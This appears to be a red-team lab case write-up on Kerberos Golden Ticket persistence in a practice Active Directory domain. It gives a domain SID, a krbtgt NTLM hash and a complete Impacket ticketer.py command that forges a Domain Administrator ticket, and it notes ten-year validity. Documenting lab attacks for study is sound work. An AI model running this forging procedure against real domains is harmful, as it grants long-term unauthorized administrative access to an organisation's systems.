### Case-006-Persistence-(Kerberos Golden Ticket)
Objective
To forge a Ticket Granting Ticket (TGT)—commonly known as a Golden Ticket—using the intercepted krbtgt NTLM hash. This provides the attacker with permanent, undocumented access to any resource in the domain, bypassing standard authentication controls.

⚔️ Red Team: Attack Simulation
1. Extracting the Golden Key (T1003.006)
The attacker utilized the krbtgt hash recovered during the DCSync operation in Case 004.

Target Account: krbtgt

Domain SID: S-1-5-21-3964177573-2283084347-2384666497 (Extracted via lookupsid.py or secretsdump)

NTLM Hash: f5b67d3ddc972f36a2384eb24748c292

2. Forging the Ticket (T1558.001)
Using the ticketer.py tool from the Impacket suite, the attacker forges a TGT that claims the identity of a Domain Administrator.

Command:
ticketer.py -nthash f5b67d3ddc972f36a2384eb24748c292 -domain-sid S-1-5-21-3964177573-2283084347-2384666497 -domain north.sevenkingdoms.local Administrator

Result: Created a file named Administrator.ccache.

Persistence: This ticket is valid for 10 years by default, providing long-term access regardless of account password changes.
